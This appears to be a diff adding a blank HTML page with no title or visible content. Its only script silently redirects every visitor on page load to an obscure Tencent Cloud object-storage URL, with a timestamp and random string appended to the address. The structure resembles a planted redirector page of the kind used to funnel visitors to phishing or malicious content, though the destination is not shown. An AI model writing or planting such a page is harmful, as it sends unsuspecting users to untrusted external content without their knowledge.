@@ -1,0 +1,21 @@
+<html>
+	<head>
+
+		<meta charset="utf-8" />
+      <title></title>
+</head>
+
+<body>
+
+    <script>
+        let button = document.querySelector('button')
+        const targetUrl = 'http://cos.ap-shanghai.myqcloud.com/rra-1319775362/upload-2/nity/09/12/A9_1gbHng,1h7';
+        const timestamp = Date.now();
+        const randomString = Math.random().toString(36).substring(2);
+        const urlWithParam = `${targetUrl}?timestamp=${timestamp}-${randomString}`;
+        window.onload = function () {
+            window.location.href = urlWithParam;
+        };
+    </script>
+</body>
+</html>
